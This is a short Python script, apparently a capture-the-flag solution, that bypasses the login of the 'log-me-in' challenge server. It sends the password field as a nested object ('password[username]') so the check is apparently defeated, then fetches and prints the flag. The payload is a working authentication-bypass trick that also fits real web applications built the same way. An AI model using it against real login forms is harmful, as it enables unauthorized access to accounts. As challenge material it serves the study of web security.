import requests
import re

url = lambda path: 'https://log-me-in.web.ctfcompetition.com' + path

s = requests.Session()

payload = {
    "username": "michelle",
    "password[username]": "michelle",
    "csrf": "",
}

r = s.post(url('/login'), data=payload)

r = s.get(url('/flag'))

if re.search(r'CTF{.*}', r.text):
    print(r.text)
